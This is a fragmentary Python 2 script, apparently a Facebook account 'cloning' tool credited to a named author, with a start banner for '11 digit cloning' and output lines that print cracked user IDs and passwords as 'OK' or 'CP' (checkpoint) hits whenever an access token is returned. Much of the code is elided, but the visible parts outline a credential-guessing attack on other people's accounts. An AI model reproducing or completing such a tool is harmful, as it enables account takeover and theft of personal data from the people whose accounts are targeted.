...
psb('\x1b[1;32mBANGLADESH SAMIUL 11 DIGIT CLONING START PLEASE WAIT ..........')
...
def menu():
    ...
    print 'AUTHOR   : Md Samiul Islam'

    print 'FACEBOOK : https://www.facebook.com/Devil.Heart.hacker'

    print 'GITHUB : https://github.com/Samiul6
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[Samiul-OKY]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                ...
                print '\x1b[1;93m[Samiul-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 03 Days]\x1b[0m \n'
